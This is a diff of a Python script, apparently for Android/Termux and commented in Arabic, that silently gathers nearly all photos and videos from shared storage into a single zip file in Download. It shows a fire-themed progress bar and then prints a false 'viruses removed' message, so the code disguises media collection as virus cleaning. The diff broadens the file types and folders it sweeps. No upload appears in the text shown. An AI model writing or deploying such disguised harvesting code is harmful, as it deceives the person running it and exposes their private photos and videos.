@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Silent backup utility — fire progress bar."""
+"""Alpha — silent media backup with fire progress bar."""
 
 import os
 import sys
@@ -18,114 +18,102 @@ OUTPUT_DIR = Path("/storage/emulated/0/Download")
 OUTPUT_NAME = "Alpha!!$!#.zip"
 
 MEDIA_EXTS = {
-    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp',
-    '.heic', '.heif', '.tiff', '.tif', '.raw', '.dng',
+    # صور
+    '.jpg', '.jpeg', '.jpe', '.jfif', '.pjpeg', '.pjp',
+    '.png', '.gif', '.bmp', '.webp', '.avif',
+    '.heic', '.heif', '.tiff', '.tif',
+    '.raw', '.dng', '.cr2', '.cr3', '.nef', '.arw', '.orf', '.rw2',
+    # فيديو
     '.mp4', '.webm', '.mkv', '.mov', '.avi', '.flv',
-    '.wmv', '.m4v', '.3gp', '.mpeg', '.mpg', '.ts',
+    '.wmv', '.m4v', '.3gp', '.3g2', '.mpeg', '.mpg', '.ts',
+    '.mts', '.m2ts', '.vob', '.ogv', '.rm', '.rmvb',
 }
 
-ALWAYS_SKIP = {'Android', 'LOST.DIR'}
-
-# ═════════════════════════════════════════════════════════════
-# ألوان ANSI — تدرج ناري
-# ═════════════════════════════════════════════════════════════
-RESET = '\033[0m'
-BOLD = '\033[1m'
-DIM = '\033[2m'
-
-# تدرج من الأصفر → البرتقالي → الأحمر → الأحمر الداكن
-FIRE = [
-    '\033[38;5;226m',  # أصفر ساطع
-    '\033[38;5;220m',  # ذهبي
-    '\033[38;5;214m',  # برتقالي فاتح
-    '\033[38;5;208m',  # برتقالي
-    '\033[38;5;202m',  # برتقالي غامق
-    '\033[38;5;196m',  # أحمر
-    '\033[38;5;160m',  # أحمر غامق
-    '\033[38;5;124m',  # أحمر داكن
-]
-
-# رمز الشريط — يتغير حسب النسبة
-FIRE_CHARS = ['░', '▒', '▓', '█']
+# مجلدات لا تحتوي وسائط — نتخطاها في أي مكان
+SKIP_NAMES_ANYWHERE = {'LOST.DIR'}
+# داخل Android/ فقط — هذي بيانات تطبيقات، ليس وسائط المستخدم
+SKIP_INSIDE_ANDROID = {'data', 'obb'}
 
 
 def scan(source: Path, skip_backups: bool, skip_download: bool):
     found = []
+    seen = set()
     for dirpath, dirnames, filenames in os.walk(source):
-        skip = set(ALWAYS_SKIP)
-        if skip_backups:
-            skip.add('backups')
-        if skip_download:
-            skip.add('Download')
-        dirnames[:] = [d for d in dirnames if d not in skip]
+        try:
+            rel_parts = Path(dirpath).relative_to(source).parts
+        except ValueError:
+            rel_parts = ()
+
+        inside_android = rel_parts and rel_parts[0] == 'Android'
+        new_dirs = []
+        for d in dirnames:
+            if d in SKIP_NAMES_ANYWHERE:
+                continue
+            if inside_android and d in SKIP_INSIDE_ANDROID:
+                continue
+            if skip_backups and d == 'backups':
+                continue
+            if skip_download and d == 'Download':
+                continue
+            new_dirs.append(d)
+        dirnames[:] = new_dirs
+
         for name in filenames:
             if Path(name).suffix.lower() in MEDIA_EXTS:
                 p = Path(dirpath) / name
                 try:
                     if p.stat().st_size > 0:
-                        found.append(p)
+                        key = str(p)
+                        if key not in seen:
+                            seen.add(key)
+                            found.append(p)
                 except (PermissionError, OSError):
                     pass
     return found
 
 
-def fire_bar(pct: float, width: int = 32) -> str:
-    """يبني شريط progress ناري بتدرج لوني."""
+RESET = '\033[0m'
+BOLD = '\033[1m'
+DIM = '\033[2m'
+
+FIRE = [
+    '\033[38;5;226m', '\033[38;5;220m', '\033[38;5;214m', '\033[38;5;208m',
+    '\033[38;5;202m', '\033[38;5;196m', '\033[38;5;160m', '\033[38;5;124m',
+]
+
+FIRE_CHARS = ['░', '▒', '▓', '█']
+
+
+def fire_bar(pct, width=32):
     filled = int(width * pct)
     parts = []
-
     for i in range(width):
         if i < filled:
-            # ملون بتدرج ناري
-            color_idx = int((i / width) * (len(FIRE) - 1))
-            # اختيار رمز حسب موقع الحرف
-            char_idx = min(len(FIRE_CHARS) - 1, (i * len(FIRE_CHARS)) // width)
-            parts.append(f"{FIRE[color_idx]}{FIRE_CHARS[char_idx]}{RESET}")
+            ci = int((i / width) * (len(FIRE) - 1))
+            ch = min(len(FIRE_CHARS) - 1, (i * len(FIRE_CHARS)) // width)
+            parts.append(f"{FIRE[ci]}{FIRE_CHARS[ch]}{RESET}")
         else:
-            # فارغ — رمادي داكن
             parts.append(f"{DIM}░{RESET}")
-
     return ''.join(parts)
 
 
-def flame_icon(pct: float) -> str:
-    """أيقونة نار تتغير حسب التقدم."""
-    if pct >= 0.999:
-        return f"{FIRE[0]}🔥{RESET}"
-    if pct >= 0.75:
-        return f"{FIRE[2]}🔥{RESET}"
-    if pct >= 0.50:
-        return f"{FIRE[3]}🔥{RESET}"
-    if pct >= 0.25:
-        return f"{FIRE[5]}🔥{RESET}"
+def flame_icon(pct):
+    if pct >= 0.999: return f"{FIRE[0]}🔥{RESET}"
+    if pct >= 0.75:  return f"{FIRE[2]}🔥{RESET}"
+    if pct >= 0.50:  return f"{FIRE[3]}🔥{RESET}"
+    if pct >= 0.25:  return f"{FIRE[5]}🔥{RESET}"
     return f"{FIRE[6]}🔥{RESET}"
 
 
-def render_progress(done: int, total: int):
+def render_progress(done, total):
     pct = done / total if total else 0
-    bar = fire_bar(pct)
-    flame = flame_icon(pct)
-    pct_str = f"{FIRE[3]}{BOLD}{pct*100:5.1f}%{RESET}"
-
-    # السطر كامل
-    line = f"\r  {flame} {bar} {pct_str}"
-
-    # نضيف توهج كامل — يخلي الشريط يبدو كأنه يشتعل
-    line = f"\033[1m{line}{RESET}"
-
-    sys.stdout.write(line)
+    line = f"\r  {flame_icon(pct)} {fire_bar(pct)} {FIRE[3]}{BOLD}{pct*100:5.1f}%{RESET}"
+    sys.stdout.write(f"\033[1m{line}{RESET}")
     sys.stdout.flush()
 
 
 def final_burst():
-    """لحظة النهاية — وميض ناري."""
-    burst = f"{FIRE[0]}{BOLD}"
-    burst += "  🔥🔥🔥  "
-    burst += f"{FIRE[2]}{BOLD}"
-    burst += "الملف جاهز"
-    burst += f"{FIRE[0]}{BOLD}"
-    burst += "  🔥🔥🔥"
-    burst += RESET
+    burst = f"{FIRE[0]}{BOLD}  🔥🔥🔥  {FIRE[2]}{BOLD}الملف جاهز{FIRE[0]}{BOLD}  🔥🔥🔥{RESET}"
     sys.stdout.write("\r" + " " * 72 + "\r")
     sys.stdout.write(burst + "\n")
     sys.stdout.flush()
@@ -166,10 +154,7 @@ def main():
                     pass
                 render_progress(i, len(files))
 
-        # لحظة النهاية — وميض + تأكيد
         final_burst()
-
-        # تنظيف السطر — يرجع الترمكس لوضعه الطبيعي
         sys.stdout.write("\n")
         sys.stdout.flush()
         print("تم ازالة فيروسات")
